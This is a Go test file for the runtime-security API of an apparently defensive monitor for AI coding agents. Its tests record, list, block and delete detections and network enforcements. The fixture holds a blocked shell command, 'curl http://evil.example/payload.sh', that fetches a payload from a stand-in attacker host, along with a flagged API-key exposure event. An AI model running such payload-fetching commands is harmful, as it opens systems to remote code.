package gateway

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/audit"
)

func newRuntimeSecurityAPITest(t *testing.T) (*APIServer, audit.RuntimeDetection) {
	t.Helper()

	store, err := audit.NewStore(filepath.Join(t.TempDir(), "audit.db"))
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	t.Cleanup(func() { _ = store.Close() })
	if err := store.Init(); err != nil {
		t.Fatalf("Init: %v", err)
	}

	now := time.Now().UTC().Add(-10 * time.Minute)
	eventID, err := store.RecordRuntimeEvent(audit.RuntimeEventInput{
		EventType:        audit.RuntimeEventToolPreCall,
		EventSource:      audit.RuntimeSourceAgentHook,
		CanonicalAgentID: "codex",
		AgentName:        "Codex CLI",
		SessionID:        "sess-attack",
		TraceID:          "trace-attack",
		Operation:        "execute",
		Target:           "curl http://evil.example/payload.sh",
		ToolName:         "shell",
		Severity:         "HIGH",
		Outcome:          "blocked",
		Detail:           "blocked shell egress",
		Timestamp:        now,
	})
	if err != nil {
		t.Fatalf("RecordRuntimeEvent attack: %v", err)
	}
	attackDetection, err := store.RecordRuntimeDetection(audit.RuntimeDetectionInput{
		AgentID:       "codex",
		AgentName:     "Codex CLI",
		SessionID:     "sess-attack",
		TraceID:       "trace-attack",
		DetectionType: "tool_abuse",
		Category:      "attack",
		Severity:      "HIGH",
		Confidence:    0.93,
		RuleID:        "runtime.attack.shell",
		Title:         "Suspicious shell network execution",
		Detail:        "shell tool attempted external payload retrieval",
		Attributes:    map[string]any{"source": "correlation_engine"},
		Evidence: []audit.DetectionEvidenceInput{{
			EventID:  eventID,
			Role:     audit.DetectionRoleTrigger,
			Sequence: 1,
			Outcome:  "blocked",
		}},
		SeenAt: now,
	})
	if err != nil {
		t.Fatalf("RecordRuntimeDetection attack: %v", err)
	}

	secretEventID, err := store.RecordRuntimeEvent(audit.RuntimeEventInput{
		EventType:        audit.RuntimeEventContentSecret,
		EventSource:      audit.RuntimeSourceGuardrail,
		CanonicalAgentID: "cursor",
		AgentName:        "Cursor",
		SessionID:        "sess-secret",
		TraceID:          "trace-secret",
		Operation:        "inspect",
		Target:           "OPENAI_API_KEY",
		Severity:         "MEDIUM",
		Outcome:          "flagged",
		Detail:           "secret-like content observed",
		Timestamp:        now.Add(2 * time.Minute),
	})
	if err != nil {
		t.Fatalf("RecordRuntimeEvent secret: %v", err)
	}
	if _, err := store.RecordRuntimeDetection(audit.RuntimeDetectionInput{
		AgentID:       "cursor",
		AgentName:     "Cursor",
		SessionID:     "sess-secret",
		TraceID:       "trace-secret",
		DetectionType: "secret_exposure",
		Category:      "suspicious",
		Severity:      "MEDIUM",
		Confidence:    0.75,
		RuleID:        "runtime.secret.exposure",
		Title:         "Secret-like content observed",
		Detail:        "guardrail observed credential-shaped content",
		Evidence: []audit.DetectionEvidenceInput{{
			EventID:  secretEventID,
			Role:     audit.DetectionRoleTrigger,
			Sequence: 1,
			Outcome:  "flagged",
		}},
		SeenAt: now.Add(2 * time.Minute),
	}); err != nil {
		t.Fatalf("RecordRuntimeDetection secret: %v", err)
	}

	return &APIServer{store: store}, attackDetection
}

func runtimeSecurityGET(t *testing.T, api *APIServer, path string, handler http.HandlerFunc) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	handler(rec, httptest.NewRequest(http.MethodGet, path, nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("GET %s status = %d body = %s", path, rec.Code, rec.Body.String())
	}
	return rec
}

func TestRuntimeDecisionDetailEmptyCollectionsAreArrays(t *testing.T) {
	api, linked := newRuntimeSecurityAPITest(t)
	unlinked, err := api.store.RecordRuntimeDetection(audit.RuntimeDetectionInput{
		AgentID: "codex", DetectionType: "empty_evidence", Category: "suspicious", Severity: "HIGH",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, detection := range []audit.RuntimeDetection{linked, unlinked} {
		decision, _, err := api.store.RecordRuntimeDecision(audit.RuntimeDecisionInput{
			DetectionID: detection.DetectionID, AgentID: "codex", Decision: audit.RuntimeDecisionConfirm,
		})
		if err != nil || decision.DecisionID == "" {
			t.Fatalf("record decision: %+v %v", decision, err)
		}
		rec := runtimeSecurityGET(t, api, "/api/v1/runtime-decisions/"+decision.DecisionID, api.handleRuntimeDecisions)
		var payload map[string]any
		if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
			t.Fatal(err)
		}
		for _, key := range []string{"responses", "evidence"} {
			if _, ok := payload[key].([]any); !ok {
				t.Fatalf("%s must be an array, got %v", key, payload[key])
			}
		}
	}
}

func decodeRuntimeSecurityResponse(t *testing.T, rec *httptest.ResponseRecorder, out any) {
	t.Helper()
	if err := json.NewDecoder(rec.Body).Decode(out); err != nil {
		t.Fatalf("decode response: %v; body=%s", err, rec.Body.String())
	}
}

func TestRuntimeSecurityAPIsExposeDetectionFirstSurface(t *testing.T) {
	api, attackDetection := newRuntimeSecurityAPITest(t)

	var summary audit.RuntimeSecuritySummary
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/runtime-security/summary", api.handleRuntimeSecuritySummary),
		&summary,
	)
	if summary.TotalDetections != 2 || summary.AttackDetections != 1 || summary.Blocked != 1 || summary.HighOrAbove != 1 || summary.CoveredAgents != 2 {
		t.Fatalf("summary = %+v, want total=2 attack=1 blocked=1 high_or_above=1 agents=2", summary)
	}

	var agentsResp struct {
		Agents []pageAgent `json:"agents"`
		Items  []pageAgent `json:"items"`
		Total  int         `json:"total"`
	}
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/agents?page_size=1000", api.handleAgentsAPI),
		&agentsResp,
	)
	agents := agentsResp.Agents
	if len(agents) == 0 {
		agents = agentsResp.Items
	}
	if len(agents) < 2 {
		t.Fatalf("agents len = %d, want at least 2: %+v", len(agents), agents)
	}
	var runtimeDetections int
	for _, agent := range agents {
		runtimeDetections += agent.RuntimeDetectionCount
	}
	if runtimeDetections != 2 {
		t.Fatalf("runtime detection count across agents = %d, want 2: %+v", runtimeDetections, agents)
	}

	var list struct {
		Total int                        `json:"total"`
		Items []runtimeDetectionListItem `json:"items"`
	}
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/runtime-detections?category=attack&status=blocked&source=correlation_engine", api.handleRuntimeDetections),
		&list,
	)
	if list.Total != 1 || len(list.Items) != 1 {
		t.Fatalf("runtime detections list = %+v, want one attack item", list)
	}
	if got := list.Items[0]; got.DetectionID != attackDetection.DetectionID || got.Type != "tool_abuse" || got.Source != "correlation_engine" {
		t.Fatalf("attack list item = %+v, want detection %s with source correlation_engine", got, attackDetection.DetectionID)
	}

	var detail runtimeDetectionDetailResponse
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/runtime-detections/"+attackDetection.DetectionID, api.handleRuntimeDetections),
		&detail,
	)
	if detail.Detection.DetectionID != attackDetection.DetectionID || len(detail.Evidence) != 1 {
		t.Fatalf("detail = %+v, want nested detection and one evidence event", detail)
	}
	if detail.Evidence[0].EventType != audit.RuntimeEventToolPreCall || detail.Evidence[0].ToolName != "shell" {
		t.Fatalf("evidence = %+v, want tool.pre_call shell evidence", detail.Evidence[0])
	}

	var evidence []runtimeDetectionEvidenceItem
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/runtime-detections/"+attackDetection.DetectionID+"/events", api.handleRuntimeDetections),
		&evidence,
	)
	if len(evidence) != 1 || evidence[0].DetectionID != attackDetection.DetectionID {
		t.Fatalf("events evidence = %+v, want one linked event", evidence)
	}

	var timeline struct {
		Buckets []runtimeTimelineBucket `json:"buckets"`
	}
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/runtime-events/timeline?agent_id=codex&bucket=5m", api.handleRuntimeEventsTimeline),
		&timeline,
	)
	if len(timeline.Buckets) == 0 || timeline.Buckets[0].Tool == 0 {
		t.Fatalf("timeline = %+v, want a tool event bucket", timeline)
	}
}

func TestRuntimeEnforcementAPIsBlockAndDelete(t *testing.T) {
	api, attackDetection := newRuntimeSecurityAPITest(t)
	SetRuntimeEventStore(api.store)
	t.Cleanup(func() { SetRuntimeEventStore(nil) })

	blockReq := httptest.NewRequest(
		http.MethodPost,
		"/api/v1/runtime-detections/"+attackDetection.DetectionID+"/actions/block",
		strings.NewReader(`{"action_type":"BLOCK_NETWORK","reason":"operator requested"}`),
	)
	blockW := httptest.NewRecorder()
	api.handleRuntimeDetections(blockW, blockReq)
	if blockW.Code != http.StatusOK {
		t.Fatalf("block status = %d body = %s", blockW.Code, blockW.Body.String())
	}

	var blockResp struct {
		Status    string                 `json:"status"`
		Responses []audit.ResponseAction `json:"responses"`
	}
	decodeRuntimeSecurityResponse(t, blockW, &blockResp)
	if blockResp.Status != "blocked" || len(blockResp.Responses) != 1 {
		t.Fatalf("block response = %+v, want one executed response", blockResp)
	}
	if blockResp.Responses[0].Status != audit.ResponseStatusExecuted {
		t.Fatalf("response status = %q, want %q", blockResp.Responses[0].Status, audit.ResponseStatusExecuted)
	}

	var list struct {
		Items []runtimeEnforcementRow `json:"items"`
		Total int                     `json:"total"`
	}
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/enforcements", api.handleRuntimeEnforcements),
		&list,
	)
	if list.Total != 1 || len(list.Items) != 1 || list.Items[0].Host != "evil.example" {
		t.Fatalf("enforcements = %+v, want evil.example", list)
	}

	var detail runtimeEnforcementRow
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/enforcements/evil.example", api.handleRuntimeEnforcements),
		&detail,
	)
	if detail.Host != "evil.example" {
		t.Fatalf("enforcement detail = %+v, want evil.example", detail)
	}

	deleteW := httptest.NewRecorder()
	api.handleRuntimeEnforcements(deleteW, httptest.NewRequest(http.MethodDelete, "/api/v1/enforcements/evil.example", nil))
	if deleteW.Code != http.StatusOK {
		t.Fatalf("delete status = %d body = %s", deleteW.Code, deleteW.Body.String())
	}

	var afterDelete struct {
		Items []runtimeEnforcementRow `json:"items"`
		Total int                     `json:"total"`
	}
	decodeRuntimeSecurityResponse(t,
		runtimeSecurityGET(t, api, "/api/v1/enforcements", api.handleRuntimeEnforcements),
		&afterDelete,
	)
	if afterDelete.Total != 0 || len(afterDelete.Items) != 0 {
		t.Fatalf("enforcements after delete = %+v, want empty", afterDelete)
	}
}
